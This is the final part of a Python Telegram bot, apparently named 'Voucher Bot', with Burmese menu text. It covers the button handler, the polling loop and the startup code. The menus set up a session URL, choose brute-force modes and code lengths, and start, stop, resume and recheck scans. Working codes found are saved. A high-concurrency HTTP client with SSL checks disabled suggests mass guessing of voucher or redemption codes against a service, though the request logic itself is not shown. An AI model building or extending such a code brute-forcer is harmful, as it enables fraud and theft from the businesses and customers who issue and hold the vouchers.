        await bot.answer_callback_query(call.id, "❌ No Permission", show_alert=True)
        return

    try:
        if data == "menu_main":
            await bot.edit_message_text("✨ VOUCHER BOT ✨\n\nMenu မှ ရွေးချယ်ပါ။",
                chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_main())

        elif data == "menu_setup":
            await bot.edit_message_text(
                "🔗 Session URL ထည့်ရန်:\n\n/setup <url>",
                chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_back())

        elif data == "menu_brute":
            await bot.edit_message_text("🎯 Mode ရွေးပါ:",
                chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_modes())

        elif data.startswith("mode_"):
            mode = data.replace("mode_", "")
            if mode not in BRUTE_MODES:
                await bot.answer_callback_query(call.id, "Invalid mode", show_alert=True)
                return
            await bot.edit_message_text(
                f"🎯 Mode: {BRUTE_MODES[mode]['name']}\n\n📏 Length ရွေးပါ:",
                chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_lengths(mode))

        elif data.startswith("len_custom_"):
            mode = data.replace("len_custom_", "")
            await bot.edit_message_text(
                f"✏️ Length ရိုက်ထည့်ရန်:\n\n/brute {mode} <length> [target]",
                chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_back())

        elif data.startswith("len_"):
            _, mode, length = data.split("_")
            await bot.edit_message_text(
                f"✅ Mode: {BRUTE_MODES[mode]['name']}\n📏 Length: {length}\n\nSTART နှိပ်ပါ:",
                chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_start(mode, length))

        elif data.startswith("start_"):
            _, mode, length = data.split("_")
            await bot.answer_callback_query(call.id, "🚀 စတင်နေပါသည်...")
            await _begin_scan(chat_id, mode, int(length), None, call.message)

        elif data == "menu_stop":
            await bot.answer_callback_query(call.id, "⏹️ ရပ်နေသည်...")
            await _stop_scan(chat_id, call.message)

        elif data == "menu_saved":
            await bot.answer_callback_query(call.id)
            await _show_saved(chat_id, call.message)

        elif data == "menu_status":
            await bot.answer_callback_query(call.id)
            await _show_status(chat_id, call.message)

        elif data == "menu_settings":
            await bot.edit_message_text("⚙️ Settings",
                chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_settings())

        elif data == "toggle_notify":
            notify_setting[chat_id] = not notify_setting.get(chat_id, True)
            state = "ON ✅" if notify_setting[chat_id] else "OFF ❌"
            await bot.answer_callback_query(call.id, f"🔔 Notify {state}", show_alert=True)

        elif data == "delete_saved":
            cnt = len(success_texts.get(chat_id, [])) + len(limited_texts.get(chat_id, []))
            success_texts.pop(chat_id, None)
            limited_texts.pop(chat_id, None)
            success_messages.pop(chat_id, None)
            limited_messages.pop(chat_id, None)
            await bot.answer_callback_query(call.id, f"🗑 Deleted {cnt} codes", show_alert=True)

        elif data == "recheck_codes":
            await bot.answer_callback_query(call.id, "⏳ Rechecking...")
            await _do_recheck(chat_id)

        elif data == "resume_scan":
            params = last_scan_params.pop(chat_id, None)
            await bot.answer_callback_query(call.id)
            if not params:
                await bot.edit_message_text("⚠️ Resume လုပ်ရန် scan မရှိပါ။",
                    chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_main())
                return
            await bot.edit_message_text("▶️ Resume စတင်နေပါသည်...",
                chat_id=chat_id, message_id=call.message.message_id)
            await _begin_scan(chat_id, params["mode"], params["length"], params["target"], call.message)

        elif data == "new_scan":
            pending_brute.pop(chat_id, None)
            await bot.answer_callback_query(call.id)
            await bot.edit_message_text("🆕 Mode အသစ်ရွေးပါ:",
                chat_id=chat_id, message_id=call.message.message_id, reply_markup=kb_modes())

        else:
            await bot.answer_callback_query(call.id)

    except Exception as e:
        logger.warning(f"callback_handler: {e}")
        try:
            await bot.answer_callback_query(call.id, "⚠️ Error", show_alert=True)
        except Exception:
            pass

# ─── Polling ───────────────────────────────────────────────────────────
async def start_polling():
    try:
        me = await bot.get_me()
        logger.info(f"🤖 Bot identity: @{me.username} (id={me.id})")
    except Exception as e:
        logger.warning(f"get_me failed: {e}")

    try:
        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("✅ Webhook cleared — long polling starting...")
    except Exception as e:
        logger.warning(f"delete_webhook: {e}")

    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=45, request_timeout=55, interval=0)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.warning(f"Polling connection error: {e}. Retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            msg = str(e)
            if "409" in msg or "Conflict" in msg:
                wait = max(backoff, 30)
                logger.warning(f"🛑 409 duplicate instance — sleeping {wait}s")
                await asyncio.sleep(wait)
                backoff = min(backoff * 2, 120)
                continue
            logger.warning(f"Polling error: {e}. Retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ─── Main ──────────────────────────────────────────────────────────────
async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(
        limit=20000, limit_per_host=10000,
        ttl_dns_cache=300, ssl=False,
    )
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector, connector_owner=False,
    )
    logger.info("🚀 Voucher Bot starting...")
    try:
        asyncio.create_task(web_server())
        if GITHUB_ENABLED:
            asyncio.create_task(github_sync_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == "__main__":
    asyncio.run(main())
